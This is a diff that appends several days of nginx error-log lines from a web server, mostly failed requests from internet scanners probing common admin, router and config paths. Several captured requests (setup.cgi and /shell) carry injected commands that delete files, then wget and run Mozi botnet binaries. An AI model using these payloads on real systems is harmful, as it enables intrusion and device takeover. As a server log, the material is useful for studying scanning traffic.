@@ -96,3 +96,286 @@
 2021/10/28 13:07:19 [notice] 1#1: signal 17 (SIGCHLD) received from 24
 2021/10/28 13:07:19 [notice] 1#1: worker process 24 exited with code 0
 2021/10/28 13:07:19 [notice] 1#1: exit
+2021/10/28 13:24:10 [notice] 1#1: using the "epoll" event method
+2021/10/28 13:24:10 [notice] 1#1: nginx/1.21.3
+2021/10/28 13:24:10 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/10/28 13:24:10 [notice] 1#1: OS: Linux 3.10.0-1160.42.2.el7.x86_64
+2021/10/28 13:24:10 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/10/28 13:24:10 [notice] 1#1: start worker processes
+2021/10/28 13:24:10 [notice] 1#1: start worker process 25
+2021/10/28 13:24:10 [notice] 1#1: start worker process 26
+2021/10/28 13:45:57 [warn] 25#25: 1024 worker_connections are not enough, reusing connections
+2021/10/28 13:48:18 [error] 25#25: *123206 open() "/usr/share/nginx/html/api/v1/login" failed (2: No such file or directory), client: 124.205.77.154, server: localhost, request: "POST /api/v1/login?name=123456&password=200000 HTTP/1.1", host: "sincos.vip"
+2021/10/28 13:49:10 [warn] 25#25: 1024 worker_connections are not enough, reusing connections
+2021/10/28 15:17:22 [error] 25#25: *188663 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/28 15:18:26 [error] 25#25: *188664 open() "/usr/share/nginx/html/cache/global/img/gs.gif" failed (2: No such file or directory), client: 89.248.164.165, server: localhost, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
+2021/10/28 16:49:56 [error] 25#25: *188674 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 120.86.252.108, server: localhost, request: "POST /HNAP1/ HTTP/1.0", host: "123.56.131.199:80"
+2021/10/28 18:39:27 [error] 25#25: *188686 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 39.103.188.117, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "123.56.131.199"
+2021/10/28 18:39:27 [error] 25#25: *188687 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 39.103.188.117, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "123.56.131.199"
+2021/10/28 18:41:33 [error] 25#25: *188688 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/28 19:39:50 [error] 25#25: *188711 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 212.129.4.166, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199:80"
+2021/10/28 21:26:50 [error] 25#25: *188719 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 54.212.203.110, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "sincos.vip"
+2021/10/28 22:27:05 [error] 25#25: *188722 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/10/28 22:29:40 [error] 25#25: *188723 open() "/usr/share/nginx/html/language/index.html" failed (2: No such file or directory), client: 23.228.109.147, server: localhost, request: "GET /language/index.html HTTP/1.1", host: "sincos.vip"
+2021/10/28 23:41:16 [error] 25#25: *188727 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/28 23:59:52 [error] 25#25: *188728 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 193.142.146.242, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/29 00:44:06 [error] 25#25: *188731 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 185.149.40.23, server: localhost, request: "GET /.env HTTP/1.1", host: "sincos.vip"
+2021/10/29 00:47:18 [error] 25#25: *188732 open() "/usr/share/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 181.54.38.196, server: localhost, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
+2021/10/29 01:46:23 [error] 25#25: *188740 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 159.223.125.139, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/10/29 04:02:07 [error] 25#25: *188744 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/29 08:16:41 [error] 25#25: *188762 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 54.189.230.128, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "sincos.vip"
+2021/10/29 08:16:43 [error] 25#25: *188763 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 54.189.230.128, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "sincos.vip"
+2021/10/29 08:52:40 [error] 25#25: *188764 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/10/29 08:55:10 [error] 25#25: *188765 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/29 09:36:11 [error] 25#25: *188766 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 109.237.103.123, server: localhost, request: "GET /.env HTTP/1.1", host: "sincos.vip"
+2021/10/29 09:36:12 [error] 25#25: *188767 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 109.237.103.123, server: localhost, request: "GET /.env HTTP/1.1", host: "www.sincos.vip"
+2021/10/29 10:18:22 [error] 25#25: *188774 open() "/usr/share/nginx/html/aaa9" failed (2: No such file or directory), client: 5.8.10.202, server: localhost, request: "GET /aaa9 HTTP/1.1", host: "123.56.131.199:80"
+2021/10/29 10:18:23 [error] 25#25: *188776 open() "/usr/share/nginx/html/aab9" failed (2: No such file or directory), client: 5.8.10.202, server: localhost, request: "GET /aab9 HTTP/1.1", host: "123.56.131.199:80"
+2021/10/29 11:17:48 [error] 25#25: *188781 open() "/usr/share/nginx/html/users/sign_in" failed (2: No such file or directory), client: 185.53.90.24, server: localhost, request: "GET /users/sign_in HTTP/1.1", host: "123.56.131.199:80"
+2021/10/29 12:11:13 [error] 25#25: *188782 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 185.254.31.122, server: localhost, request: "GET /.env HTTP/1.1", host: "sincos.vip"
+2021/10/29 12:17:59 [error] 25#25: *188784 open() "/usr/share/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 111.221.46.50, server: localhost, request: "GET /_ignition/execute-solution HTTP/1.1", host: "sincos.vip"
+2021/10/29 13:07:26 [error] 25#25: *188796 open() "/usr/share/nginx/html/nice ports,/Trinity.txt.bak" failed (2: No such file or directory), client: 165.227.136.172, server: localhost, request: "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0"
+2021/10/29 16:30:13 [error] 25#25: *188804 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/29 19:05:01 [error] 25#25: *188810 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 69.162.231.10, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/10/29 19:25:49 [error] 25#25: *188812 open() "/usr/share/nginx/html/cache/global/img/gs.gif" failed (2: No such file or directory), client: 89.248.164.165, server: localhost, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
+2021/10/29 21:32:59 [error] 25#25: *188822 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 120.85.106.25, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2021/10/29 21:33:15 [error] 25#25: *188823 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/29 21:35:52 [error] 25#25: *188826 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 54.213.231.185, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "sincos.vip"
+2021/10/29 22:17:19 [error] 25#25: *188829 open() "/usr/share/nginx/html/ccpvbzacbhczc" failed (2: No such file or directory), client: 178.128.194.144, server: localhost, request: "GET /ccpvbzacbhczc HTTP/1.1", host: "123.56.131.199"
+2021/10/29 23:57:22 [error] 25#25: *188839 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 183.136.225.14, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199:80"
+2021/10/29 23:57:22 [error] 25#25: *188840 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 183.136.225.14, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "123.56.131.199:80"
+2021/10/29 23:59:33 [error] 25#25: *188841 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/10/30 01:09:45 [error] 25#25: *188849 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 168.119.143.102, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199", referrer: "http://123.56.131.199/"
+2021/10/30 04:10:22 [error] 25#25: *188854 open() "/usr/share/nginx/html/actuator/health" failed (2: No such file or directory), client: 192.241.205.55, server: localhost, request: "GET /actuator/health HTTP/1.1", host: "123.56.131.199"
+2021/10/30 07:06:31 [error] 25#25: *188859 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/30 07:22:17 [error] 25#25: *188861 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 39.103.204.21, server: localhost, request: "POST /sdk HTTP/1.1", host: "123.56.131.199"
+2021/10/30 07:22:17 [error] 25#25: *188862 open() "/usr/share/nginx/html/text4041635578537" failed (2: No such file or directory), client: 39.103.204.21, server: localhost, request: "GET /text4041635578537 HTTP/1.1", host: "123.56.131.199"
+2021/10/30 07:22:17 [error] 25#25: *188865 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 39.103.204.21, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "123.56.131.199"
+2021/10/30 07:22:17 [error] 25#25: *188867 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 39.103.204.21, server: localhost, request: "GET /evox/about HTTP/1.1", host: "123.56.131.199"
+2021/10/30 07:22:27 [error] 25#25: *188871 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 39.103.204.21, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199"
+2021/10/30 07:22:27 [error] 25#25: *188872 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 39.103.204.21, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "123.56.131.199"
+2021/10/30 08:27:42 [error] 25#25: *188877 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 58.248.149.68, server: localhost, request: "POST /HNAP1/ HTTP/1.0", host: "123.56.131.199:80"
+2021/10/30 08:47:50 [error] 25#25: *188878 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 193.142.146.242, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/30 09:03:54 [error] 25#25: *188879 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 120.85.118.187, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "123.56.131.199:80"
+2021/10/30 13:02:58 [error] 25#25: *188889 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/30 13:24:09 [error] 25#25: *188890 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 120.85.91.226, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2021/10/30 13:31:14 [error] 25#25: *188891 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/30 13:34:28 [error] 25#25: *188896 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 111.13.63.75, server: localhost, request: "POST /sdk HTTP/1.1", host: "123.56.131.199"
+2021/10/30 13:34:28 [error] 25#25: *188895 open() "/usr/share/nginx/html/nmaplowercheck1635600853" failed (2: No such file or directory), client: 111.13.63.75, server: localhost, request: "GET /nmaplowercheck1635600853 HTTP/1.1", host: "123.56.131.199"
+2021/10/30 13:34:28 [error] 25#25: *188897 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 111.13.63.75, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "123.56.131.199"
+2021/10/30 13:34:28 [error] 25#25: *188898 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 111.13.63.75, server: localhost, request: "GET /evox/about HTTP/1.1", host: "123.56.131.199"
+2021/10/30 13:34:38 [error] 25#25: *188902 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 111.13.63.75, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199:80"
+2021/10/30 15:02:11 [error] 25#25: *188905 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 13.58.130.17, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/10/30 15:30:26 [error] 25#25: *188908 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 185.254.31.134, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/10/30 16:14:39 [error] 25#25: *188912 open() "/usr/share/nginx/html/wp-login.php" failed (2: No such file or directory), client: 192.81.214.168, server: localhost, request: "GET /wp-login.php HTTP/1.1", host: "sincos.vip"
+2021/10/30 17:06:44 [error] 25#25: *188917 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.61.184.37, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/30 17:28:45 [error] 25#25: *188920 open() "/usr/share/nginx/html/recordings/page.framework.php" failed (2: No such file or directory), client: 45.157.60.119, server: localhost, request: "GET /recordings/page.framework.php HTTP/1.1", host: "localhost"
+2021/10/30 17:42:00 [error] 25#25: *188921 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/30 18:06:36 [error] 25#25: *188923 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 20.115.67.160, server: localhost, request: "HEAD /robots.txt HTTP/1.0"
+2021/10/30 19:34:44 [error] 25#25: *188928 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/10/30 20:27:14 [error] 25#25: *188934 open() "/usr/share/nginx/html/index.php" failed (2: No such file or directory), client: 172.247.34.130, server: localhost, request: "POST /index.php HTTP/1.1", host: "sincos.vip"
+2021/10/30 21:06:33 [error] 25#25: *188938 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.61.184.37, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/30 21:25:15 [error] 25#25: *188942 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 52.42.188.45, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "sincos.vip"
+2021/10/30 23:20:19 [error] 25#25: *188946 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/10/30 23:33:02 [error] 25#25: *188947 open() "/usr/share/nginx/html/cache/global/img/gs.gif" failed (2: No such file or directory), client: 89.248.164.165, server: localhost, request: "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1", host: "www.baidu.com"
+2021/10/31 00:06:53 [error] 25#25: *188950 open() "/usr/share/nginx/html/dispatch.asp" failed (2: No such file or directory), client: 23.146.241.135, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "123.56.131.199:80"
+2021/10/31 00:28:57 [error] 25#25: *188952 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 69.162.230.6, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/10/31 00:35:06 [error] 25#25: *188954 open() "/usr/share/nginx/html/dispatch.asp" failed (2: No such file or directory), client: 23.146.241.135, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "123.56.131.199:80"
+2021/10/31 02:14:09 [error] 25#25: *188958 open() "/usr/share/nginx/html/dispatch.asp" failed (2: No such file or directory), client: 23.146.241.135, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "123.56.131.199:80"
+2021/10/31 02:24:51 [error] 25#25: *188959 open() "/usr/share/nginx/html/dispatch.asp" failed (2: No such file or directory), client: 23.146.241.135, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "123.56.131.199:80"
+2021/10/31 03:32:58 [error] 25#25: *188962 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/10/31 04:28:02 [error] 25#25: *188965 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/31 07:14:57 [error] 25#25: *188970 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 40.85.178.29, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/10/31 08:41:20 [error] 25#25: *188975 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 198.98.49.124, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/31 08:46:27 [error] 25#25: *188977 open() "/usr/share/nginx/html/dispatch.asp" failed (2: No such file or directory), client: 23.146.241.135, server: localhost, request: "GET /dispatch.asp HTTP/1.1", host: "123.56.131.199:80"
+2021/10/31 08:59:51 [error] 25#25: *188980 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/31 09:21:20 [error] 25#25: *188981 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/10/31 09:45:23 [error] 25#25: *188983 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.61.184.37, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/31 11:51:33 [error] 25#25: *188991 open() "/usr/share/nginx/html/phpmyadmin/index.php" failed (2: No such file or directory), client: 104.168.243.56, server: localhost, request: "GET /phpmyadmin/index.php HTTP/1.1", host: "123.56.131.199"
+2021/10/31 11:51:33 [error] 25#25: *188991 open() "/usr/share/nginx/html/pmd/index.php" failed (2: No such file or directory), client: 104.168.243.56, server: localhost, request: "GET /pmd/index.php HTTP/1.1", host: "123.56.131.199"
+2021/10/31 11:51:34 [error] 25#25: *188991 open() "/usr/share/nginx/html/phpmyadmin4.8.5/index.php" failed (2: No such file or directory), client: 104.168.243.56, server: localhost, request: "GET /phpmyadmin4.8.5/index.php HTTP/1.1", host: "123.56.131.199"
+2021/10/31 12:15:22 [error] 25#25: *188992 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 173.212.246.2, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/10/31 13:47:28 [error] 25#25: *188994 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/31 15:48:06 [error] 25#25: *188998 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/10/31 16:21:43 [error] 25#25: *189002 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 34.70.78.185, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/10/31 16:57:56 [error] 25#25: *189004 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 125.127.154.125, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "123.56.131.199:80"
+2021/10/31 17:53:32 [error] 25#25: *189007 open() "/usr/share/nginx/html/404/index.html" failed (2: No such file or directory), client: 222.186.19.235, server: localhost, request: "GET http://fuwu.sogou.com/404/index.html HTTP/1.1", host: "fuwu.sogou.com"
+2021/10/31 17:53:32 [error] 25#25: *189008 open() "/usr/share/nginx/html/404/index.html" failed (2: No such file or directory), client: 222.186.19.235, server: localhost, request: "GET http://fuwu.sogou.com/404/index.html HTTP/1.1", host: "fuwu.sogou.com"
+2021/10/31 18:31:21 [error] 25#25: *189012 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/31 20:41:13 [error] 25#25: *189022 open() "/usr/share/nginx/html/manager/text/list" failed (2: No such file or directory), client: 192.241.201.125, server: localhost, request: "GET /manager/text/list HTTP/1.1", host: "123.56.131.199"
+2021/10/31 21:07:38 [error] 25#25: *189023 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/10/31 23:35:22 [error] 25#25: *189042 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 211.95.50.173, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199"
+2021/10/31 23:35:22 [error] 25#25: *189044 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 211.95.50.173, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "sincos.vip"
+2021/10/31 23:40:35 [error] 25#25: *189045 open() "/usr/share/nginx/html/manager/html" failed (2: No such file or directory), client: 192.241.201.165, server: localhost, request: "GET /manager/html HTTP/1.1", host: "123.56.131.199"
+2021/11/01 00:19:15 [error] 25#25: *189048 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 01:31:46 [error] 25#25: *189054 open() "/usr/share/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 206.221.176.148, server: localhost, request: "GET http://1.1.1.1/cdn-cgi/trace HTTP/1.1", host: "1.1.1.1"
+2021/11/01 01:59:55 [error] 25#25: *189056 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 198.98.56.220, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 02:05:24 [error] 25#25: *189060 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 209.141.52.116, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "123.56.131.199"
+2021/11/01 02:05:30 [error] 25#25: *189061 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 209.141.52.116, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "123.56.131.199"
+2021/11/01 02:05:36 [error] 25#25: *189062 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 209.141.52.116, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "123.56.131.199"
+2021/11/01 03:03:48 [error] 25#25: *189067 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.61.184.37, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 03:22:44 [error] 25#25: *189069 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/11/01 03:51:59 [error] 25#25: *189072 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 205.185.113.41, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 05:01:31 [error] 25#25: *189073 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 72.47.16.108, server: localhost, request: "GET /.env HTTP/1.1", host: "123.56.131.199"
+2021/11/01 05:10:31 [error] 25#25: *189075 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.134.225.15, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 05:38:29 [error] 25#25: *189077 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.62.185, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "123.56.131.199:80"
+2021/11/01 06:46:15 [error] 25#25: *189084 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 09:51:56 [error] 25#25: *189093 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.51.171, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "123.56.131.199:80", referrer: "http://123.56.131.199:80/admin/login.asp"
+2021/11/01 09:59:01 [error] 25#25: *189095 open() "/usr/share/nginx/html/text4041635760741" failed (2: No such file or directory), client: 8.142.74.87, server: localhost, request: "GET /text4041635760741 HTTP/1.1", host: "123.56.131.199"
+2021/11/01 09:59:01 [error] 25#25: *189097 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 8.142.74.87, server: localhost, request: "POST /sdk HTTP/1.1", host: "123.56.131.199"
